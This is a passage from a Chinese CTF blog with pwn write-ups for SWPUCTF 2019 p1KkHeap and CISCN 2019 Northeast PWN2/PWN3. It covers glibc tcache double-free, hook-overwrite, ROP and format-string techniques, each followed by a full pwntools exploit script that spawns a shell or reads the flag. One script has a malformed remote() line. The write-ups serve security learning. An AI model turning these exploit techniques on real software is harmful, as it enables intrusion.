<h2 id="参考链接"><a class="header-anchor" href="#参考链接">¶</a>参考链接</h2>
<p><a href="https://www.bilibili.com/video/BV1Uv411j7fr?p=28">https://www.bilibili.com/video/BV1Uv411j7fr?p=28</a><br>
<a href="https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd">https://mp.weixin.qq.com/s?__biz=MzkxMTI2NTQ0NA==&amp;mid=2247483912&amp;idx=5&amp;sn=08530a5ac5dd9b87ca43d9abff3939de&amp;chksm=c11f99c3f66810d53cdec65944e86e59af183102337f0f35b284ccb19456bee99df8cbe02255&amp;mpshare=1&amp;scene=23&amp;srcid=08265eMSjEXjdjMfogEOv6UO&amp;sharer_sharetime=1629949810901&amp;sharer_shareid=e6354a0018f4b85eab5b69e4a2130a22#rd</a><br>
<a href="https://www.cnblogs.com/hetianlab/p/13884739.html">https://www.cnblogs.com/hetianlab/p/13884739.html</a><br>
<a href="https://blog.csdn.net/seaaseesa/article/details/104314949">https://blog.csdn.net/seaaseesa/article/details/104314949</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn笔记</tag>
        <tag>glibc堆</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF pwn 刷题记录(持续更新)</title>
    <url>/2021/10/04/NSSCTF%20pwn%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>这是一个记录在NSSCTF平台上刷pwn题的博客，题目顺序按照刷题的先后顺序</p>
<span id="more"></span>
<h2 id="SWPUCTF-2019-p1KkHeap"><a class="header-anchor" href="#SWPUCTF-2019-p1KkHeap">¶</a>SWPUCTF_2019_p1KkHeap</h2>
<h3 id="题目考点"><a class="header-anchor" href="#题目考点">¶</a>题目考点</h3>
<pre><code>1.tacahe bin attact
2.unsorted bin attact
3.malloc hook
</code></pre>
<h3 id="函数"><a class="header-anchor" href="#函数">¶</a>函数</h3>
<p>main 其中的各种功能只能调用18次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  const char *v3; // rdi</span><br><span class="line">  int v4; // eax</span><br><span class="line"></span><br><span class="line">  sub_B0A();</span><br><span class="line">  v3 = &quot;                           Welcome to SWPUCTF 2019&quot;;</span><br><span class="line">  puts(&quot;                           Welcome to SWPUCTF 2019&quot;);</span><br><span class="line">  while ( dword_202024 &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_10C5();</span><br><span class="line">    v4 = sub_1076(v3, a2);</span><br><span class="line">    if ( v4 == 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_EC1();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 &gt; 3 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v4 == 5 )</span><br><span class="line">        ((void (*)(void))sub_E04)();</span><br><span class="line">      if ( v4 &lt; 5 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_FD1();</span><br><span class="line">      &#125;</span><br><span class="line">      else if ( v4 == 666 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = &quot;p1Kk wants a boyfriend!&quot;;</span><br><span class="line">        puts(&quot;p1Kk wants a boyfriend!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_E1E();</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( v4 == 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_F58();</span><br><span class="line">    &#125;</span><br><span class="line">    --dword_202024;                             // 18</span><br><span class="line">  &#125;</span><br><span class="line">  sub_E04(v3, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sub_BA0  完成初始化以及沙盒,通过seccomp-tools得知禁用了one_gadget系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setbuf(stdin, 0LL);</span><br><span class="line">setbuf(stdout, 0LL);</span><br><span class="line">setbuf(stderr, 0LL);</span><br><span class="line">fd = open(&quot;./logo&quot;, 4);</span><br><span class="line">read(fd, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, &amp;unk_202140, 0x10932uLL);</span><br><span class="line">write(1, asc_202040, 0x52uLL);</span><br><span class="line">close(fd);</span><br><span class="line">if ( mmap((void *)0x66660000, 0x1000uLL, 7, 34, -1, 0LL) != (void *)1717960704 )// 在0x66660000处映射了0x1000大小的内存</span><br><span class="line">  exit(-1);</span><br><span class="line">memset((void *)0x66660000, 0, 0x1000uLL);</span><br><span class="line">strcpy((char *)0x66660000, &quot;SWPUCTF_p1Kk&quot;);</span><br><span class="line">prctl(38, 1LL, 0LL, 0LL, 0LL);                // 沙箱禁用</span><br></pre></td></tr></table></figure>
<p>add</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_E1E(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  int v3; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  size_t size; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;size: &quot;);</span><br><span class="line">  size = sub_1076();</span><br><span class="line">  if ( size &gt; 0x100 )                           // 最大申请0x100</span><br><span class="line">    sub_E04(&quot;size: &quot;, a2);</span><br><span class="line">  v3 = sub_DA9();</span><br><span class="line">  if ( v3 &lt;= 7 )                                // 最多申请7个</span><br><span class="line">  &#123;</span><br><span class="line">    qword_202100[v3] = malloc(size);</span><br><span class="line">    dword_2020E0[v3] = size;</span><br><span class="line">  &#125;</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>delete</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_FD1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  if ( dword_202020 &lt;= 0 )</span><br><span class="line">    sub_E04(a1, a2);</span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  free((void *)qword_202100[v3]);</span><br><span class="line">  dword_2020E0[v3] = 0;                         // 这里只把大小清零，却没把指针清零 存在UAF</span><br><span class="line">  --dword_202020;                               // dword_202020=3，只能free三次</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>show</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_F58(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  puts((const char *)qword_202100[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>edit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __fastcall sub_EC1(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  printf(&quot;id: &quot;);</span><br><span class="line">  v3 = sub_1076();</span><br><span class="line">  if ( v3 &gt; 7 )</span><br><span class="line">    sub_E04(&quot;id: &quot;, a2);</span><br><span class="line">  printf(&quot;content: &quot;);</span><br><span class="line">  read(0, *((void **)&amp;qword_202100 + v3), dword_2020E0[v3]);</span><br><span class="line">  return puts(&quot;Done!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="攻击思路"><a class="header-anchor" href="#攻击思路">¶</a>攻击思路</h3>
<p>这里是转自星盟的ha1vk师傅的攻击思路</p>
<p>我们该如何触发shellcode或ROP，在这，我们可以攻击__malloc_hook，将shellcode的地址写入到__malloc_hook，在这里，ROP显然很麻烦，因为ROP还要做栈转移，并且需要先前依靠一段shellcode来转移栈，如果供我们存放shellcode的地方空间很小，那么我们可以考虑写一段简短的shellcode，将栈转移，但是，如果我们有足够的空间来放shellcode，那么，直接把读取和输出flag的shellcode写到那个空间。</p>
<p>对于可写shellcode的空间很小，我还想到了另外一种方法，那就是写一段简短的shellcode，来调用int mprotect(const void *start, size_t len, int prot)函数，将某地址处属性修改为可执行，比如，我们可以把某个堆修改为可执行，那么就能在堆里布下shellcode。</p>
<p>程序在0x66660000这个固定的地址处映射了0x1000大小的空间，并且属性为RWX，既可读写，也具有执行属性，并且地址固定为0x66660000，使得我们更加方便。</p>
<p>所以，我们决定把shellcode写到0x66660000处，然后攻击malloc_hook,在malloc_hook处写入0x66660000，这样，当我们再次malloc时，就会执行shellcode。</p>
<p>首先，需要泄露一些地址，那么需要用到unsorted bin，但是，由于tcache的存在，对应的tcache bin满7个，接下来的堆块才会放入unsorted bin。满7个，就必须delete 7次，本题最多只能用3次，显然这个方案不可行。</p>
<p>下面是tcache的源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct malloc_par  </span><br><span class="line">&#123;  </span><br><span class="line">  /* Tunable parameters */  </span><br><span class="line">  unsigned long trim_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T top_pad;  </span><br><span class="line">  INTERNAL_SIZE_T mmap_threshold;  </span><br><span class="line">  INTERNAL_SIZE_T arena_test;  </span><br><span class="line">  INTERNAL_SIZE_T arena_max;  </span><br><span class="line">  </span><br><span class="line">  /* Memory map support */  </span><br><span class="line">  int n_mmaps;  </span><br><span class="line">  int n_mmaps_max;  </span><br><span class="line">  int max_n_mmaps;  </span><br><span class="line">  /* the mmap_threshold is dynamic, until the user sets </span><br><span class="line">     it manually, at which point we need to disable any </span><br><span class="line">     dynamic behavior. */  </span><br><span class="line">  int no_dyn_threshold;  </span><br><span class="line">  </span><br><span class="line">  /* Statistics */  </span><br><span class="line">  INTERNAL_SIZE_T mmapped_mem;  </span><br><span class="line">  INTERNAL_SIZE_T max_mmapped_mem;  </span><br><span class="line">  </span><br><span class="line">  /* First address handed out by MORECORE/sbrk.  */  </span><br><span class="line">  char *sbrk_base;  </span><br><span class="line">  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  /* Maximum number of buckets to use.  */  </span><br><span class="line">  size_t tcache_bins;  </span><br><span class="line">  size_t tcache_max_bytes;  </span><br><span class="line">  /* Maximum number of chunks in each bucket.  */  </span><br><span class="line">  size_t tcache_count;  </span><br><span class="line">  /* Maximum number of chunks to remove from the unsorted list, which </span><br><span class="line">     aren&#x27;t used to prefill the cache.  */  </span><br><span class="line">  size_t tcache_unsorted_limit;  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">static struct malloc_par mp_ =  </span><br><span class="line">&#123;  </span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,  </span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,  </span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,  </span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,  </span><br><span class="line">#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))  </span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (1)  </span><br><span class="line">#if USE_TCACHE  </span><br><span class="line">  ,  </span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,  </span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,  </span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),  </span><br><span class="line">  .tcache_unsorted_limit = 0 /* No limit.  */  </span><br><span class="line">#endif  </span><br><span class="line">&#125;;  </span><br></pre></td></tr></table></figure>
<p>注意，size_t tcache_bins;是无符号的，但是 tcache-&gt;counts[tc_idx]是有符号数组</p>
<p>当一个有符号数和一个无符号数进行比较时，有符号数会先转换成无符号数，然后再进行比较。</p>
<p>那么，假设，我们double free同一个堆，那么在tcache bin里就会构成循环链表，此时count=2，然后，我们再create 3个一样大小的堆，那么count就变成了-1,此时，我们再delete一个unsorted bin范围的堆，这个堆就会放入unsorted bin，然后我们用show功能就能泄露出libc中的指针。</p>
<p>但是该程序只能free3次，所以我们用一次攻击，直接去攻击tcache bin的表头，那么，下次，我们就能直接修改表头，来决定下一次堆分配到哪个地方。</p>
<h3 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/pwn/heap/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="number">1.14</span><span class="number">.71</span><span class="number">.254</span>:<span class="number">28070</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;size:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Choice:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;content:&#x27;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#tcache_dup</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#1_chunk get tcache_entry</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">first_chunk=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">tcache_entry=first_chunk-<span class="number">0x198</span>-<span class="number">0x110</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(tcache_entry))</span><br><span class="line"><span class="comment">#edit fd -&gt; tache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(tcache_entry))</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#3 </span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#4 get tcache_entry</span></span><br><span class="line">rwx_add=<span class="number">0x66660000</span></span><br><span class="line">edit(<span class="number">4</span>,p64(rwx_add))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5 get rwx memory</span></span><br><span class="line"><span class="comment">#write shellcode</span></span><br><span class="line">shellcode=shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode+=shellcraft.read(<span class="number">3</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">shellcode+=shellcraft.write(<span class="number">1</span>,<span class="number">0x66660100</span>,<span class="number">64</span>)</span><br><span class="line">edit(<span class="number">5</span>,asm(shellcode))</span><br><span class="line"><span class="comment">#tcache_count is -1(0xff) now</span></span><br><span class="line"><span class="comment">#unsortbin attack</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">libc_base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#malloc_hijack</span></span><br><span class="line">malloc_hook=libc_base+<span class="number">0x3ebc30</span></span><br><span class="line">edit(<span class="number">4</span>,p64(malloc_hook))<span class="comment">#edit tcache_entry</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#6 get malloc_hook</span></span><br><span class="line">edit(<span class="number">6</span>,p64(rwx_add))</span><br><span class="line"><span class="comment">#getflag</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019东北-PWN2"><a class="header-anchor" href="#CISCN-2019东北-PWN2">¶</a>CISCN 2019东北 PWN2</h2>
<h3 id="IDA分析"><a class="header-anchor" href="#IDA分析">¶</a>IDA分析</h3>
<p>encrypt 函数中有个栈溢出，这题直接ret2libc</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="2.png-39.5kB"></p>
<h3 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&#x27;/home/hgg/Desktop/pwn/pwn2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/hgg/Desktop/libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c80 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c82 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007f0 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400aec : pop rbx ; pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c81 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004006b9 : ret</span></span><br><span class="line"><span class="string">0x00000000004008ca : ret 0x2017</span></span><br><span class="line"><span class="string">0x0000000000400962 : ret 0x458b</span></span><br><span class="line"><span class="string">0x00000000004009c5 : ret 0xbf02</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unique gadgets found: 15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;pwn2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28015</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">pop_4 = <span class="number">0x400c7c</span></span><br><span class="line">ret = <span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	p = <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> payload:</span><br><span class="line">		x = <span class="built_in">chr</span>(x)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">96</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">122</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">64</span> <span class="keyword">or</span> <span class="built_in">ord</span>(x)&gt;<span class="number">90</span>:</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">ord</span>(x)&gt;<span class="number">47</span> <span class="keyword">and</span> <span class="built_in">ord</span>(x)&lt;=<span class="number">57</span>:</span><br><span class="line">					x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xc</span>)</span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xd</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			x=<span class="built_in">chr</span>(<span class="built_in">ord</span>(x)^<span class="number">0xe</span>)</span><br><span class="line">		p += x</span><br><span class="line">	<span class="keyword">return</span>(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(encrypt(payload))</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_addr + <span class="number">0x1b3e9a</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)+p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice!\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="CISCN-2019东北-PWN3"><a class="header-anchor" href="#CISCN-2019东北-PWN3">¶</a>CISCN 2019东北 PWN3</h2>
<h3 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h3>
<p>main函数</p>
<p><img src="http://static.zybuluo.com/hgggg/8o7absc9hgkjttq01vk27xh9/2.png" alt="5.png-36.5kB"></p>
<p>print_chk()明显是个格式化字符串</p>
<p>这个题能用的函数就两个</p>
<p>add</p>
<p><img src="http://static.zybuluo.com/hgggg/dqyexxjen9e2l5hdeapnnpap/3.png" alt="3.png-31.2kB"></p>
<p>delete</p>
<p><img src="http://static.zybuluo.com/hgggg/nq6c5o48hap4cvvg7iz1vlj1/4.png" alt="4.png-22.6kB"></p>
<p>存在UAF</p>
<h3 id="题目思路"><a class="header-anchor" href="#题目思路">¶</a>题目思路</h3>
<p>题目给的环境是Ubuntu 18 glibc 2.27</p>
<p>这里直接就一个格式化字符串泄露libc地址再tcachebin double free 来Getshell</p>
<h3 id="exp-v3"><a class="header-anchor" href="#exp-v3">¶</a>exp</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;/home/hgg/Desktop/pwn27/pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28046)</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,story</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,story)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">p.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaaa%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span>)</span><br><span class="line">s = <span class="built_in">str</span>(p.recv(<span class="number">130</span>)).split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(s[<span class="number">7</span>],<span class="number">16</span>)-<span class="number">0x81237</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Please input your ID.&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_hook = libc_addr + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span 